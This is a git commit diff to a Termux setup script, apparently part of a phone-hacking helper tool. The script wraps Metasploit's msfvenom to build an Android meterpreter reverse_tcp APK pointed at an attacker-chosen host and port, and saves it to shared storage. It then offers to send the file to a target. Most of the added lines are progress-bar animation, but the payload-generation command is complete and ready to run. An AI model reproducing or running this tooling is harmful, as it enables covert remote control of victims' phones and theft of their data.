1898028b3de62b7746875a6bcc6ae97aea2a5825
abhackerofficial <abhackerofficial@gmail.com>
2020-11-25 10:05:55 +0530

    Initial commit

--- .setup/extra.sh
+++ .setup/extra.sh
@@ -1,5 +1,14 @@
 #!/usr/bin/bash
 
+c1=$'\e[0;1;38;2;66;133;255m'
+c2=$'\e[0;38;2;50;60;70m'
+c3=$'\e[0m'
+slp=$'sleep 0.03'
+
+PUT(){ echo -en "\033[${1};${2}H";}
+HIDE(){ echo -en "\033[?25l";}
+NORM(){ echo -en "\033[?12l\033[?25h";}
+
 if [ ! -d "/data/data/com.termux/files/usr/opt/metasploit-framework" ]; then
 echo
 echo -e '\033[1;91m[!] You have to install "Metasploit-framework" ; then you can use it."\033[0m'
@@ -45,32 +54,76 @@ termux-setup-storage
 sleep 5
 fi
 
-spin () {
+echo;HIDE
+function payload() {
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /data/data/com.termux/files/usr/tmp/$app.apk
+cd /data/data/com.termux/files/usr/tmp
+mv $app.apk /sdcard ;}
 
-local pid=$!
-local delay=0.25
-local spinner=( '' '.' '..' '...' )
-
-while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-
-for i in "${spinner[@]}"
-do
-	tput civis
-	echo -ne "\033[1;94m\r[\e[1;92m+\e[1;94m] Creating Payload wait\033[1;92m$i\033[0m    \r";
-	sleep $delay
-        printf "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b";
+echo -e "${c1}Creating Payload wait..."
+function progress_bar() {
+while true ;do
+echo -ne "${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}             \r"
+$slp
+echo -ne "${c1}▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}        \r"
+$slp
+echo -ne "${c1}▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}        \r"
+$slp
+echo -ne "${c1}▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}        \r"
+$slp
+echo -ne "${c1}▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}        \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}        \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c2}▬${c3}         \r"
+$slp
+echo -ne "${c1}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬${c3}              \r"
+if [ -f "/sdcard/${app}.apk" ];then
+echo -ne "                                                \r"
+NORM
+break
+fi
 done
-done
-tput cnorm
-printf "\e[1m[\e[1;92m√\e[0m\e[1m]\e[92m Payload Created\e\e[0m           ";
-echo "";
-
 }
-trap '' 2
-echo
-( msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcard/$app.apk ) & spin
-trap 5
-echo
+
+trap '' SIGTSTP
+trap '' SIGINT
+payload & progress_bar
+
 echo -e "\033[0m\033[1m[√] Payload Saved Dir : emulated/0/${app}.apk"
 echo
 echo -e "\e[0m==> Open: [O/o] :: Delete: [D/d] :: Send: [S/s] :: Payload: ${app}.apk"
